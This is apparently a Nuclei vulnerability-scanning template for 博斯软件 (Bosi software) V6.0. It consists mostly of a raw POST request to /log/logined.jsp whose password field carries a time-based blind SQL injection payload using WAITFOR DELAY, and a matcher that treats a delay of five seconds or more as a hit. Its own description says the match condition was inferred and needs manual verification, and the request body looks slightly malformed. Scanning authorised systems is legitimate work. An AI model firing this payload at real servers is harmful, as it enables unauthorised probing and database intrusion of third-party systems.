id: poc-53edb92cfa2810020c20
info:
  name: 博斯软件V6.0存在sql注入
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /log/logined.jsp HTTP/1.1

    Content-Type: application/x-www-form-urlencoded

    X-Requested-With: XMLHttpRequest

    Cookie: JSESSIONID=80D835813F9733E867790648CBAA0EC6

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    Accept-Encoding: gzip,deflate

    Content-Length: 106

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36

    Host: {{Hostname}}

    Connection: Keep-alive


    Submit=-1A&account=-1password=g-1'';WAITFOR DELAY ''0:0:5''--'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
